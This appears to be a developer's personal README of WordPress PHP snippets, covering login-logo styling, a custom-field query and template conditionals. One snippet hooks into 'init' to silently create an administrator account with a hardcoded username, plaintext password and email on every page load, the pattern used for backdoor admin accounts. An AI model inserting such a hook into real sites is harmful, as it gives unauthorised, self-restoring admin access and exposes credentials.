# CodeSnippets
CodeSnippets that I refer to a lot:

# WordPress

#### Customizing the Login Form
```php
function my_login_logo() { ?>
  <style type="text/css">
    #login h1 a, .login h1 a {
      background-image: url(<?php echo get_stylesheet_directory_uri(); ?>/images/site-login-logo.png);
      width:160px;
      height:93px;        
      background-size: 160px 93px;
      background-repeat: no-repeat;
      padding-bottom: 20px;
    }
  </style>
<?php }
add_action( 'login_enqueue_scripts', 'my_login_logo' );
```


#### Image
```php
<img src="<?php bloginfo('stylesheet_directory'); ?>/img/email-at-sign.png" alt="email" />
```


#### Query by Custom Field
```php
<?php
  $args = array(
    'post_type' => array(
      'your-post-type',
      ),
    'order' => 'ASC',           
    'orderby' => 'menu_order',
    'meta_key' => 'your-custom-field',
    'meta_value' => 'your-custom-field-value'
  );

  $the_query = new WP_Query( $args );
  // The Loop

  if ( $the_query->have_posts() ) :
  while ( $the_query->have_posts() ) : $the_query->the_post(); 
  ?>

  THE STUFF THAT HAPPENS

  <?php
  endwhile;
  endif;

// Reset Post Data
wp_reset_postdata();
?>
```


#### IF Single Title
```php
<?php if (is_single( array( 'title'  ) ) ) : ?>
<?php endif; ?>  
```


#### Add User via Functions
```php
<?php
function add_admin_acct(){
	$login = 'matt';
	$passw = 'mte2015';
	$email = 'matt@emptyhead.com.au';

	if ( !username_exists( $login )  && !email_exists( $email ) ) {
		$user_id = wp_create_user( $login, $passw, $email );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
}
add_action('init','add_admin_acct');
?>
```

#### IF ELSE field
```php
<?php if( get_field('field_name') ): ?>
<?php endif; ?>

<?php if( get_field('image_gallery') ) { ?>
 x
<?php } else { ?>
 x
<?php } ?>
```
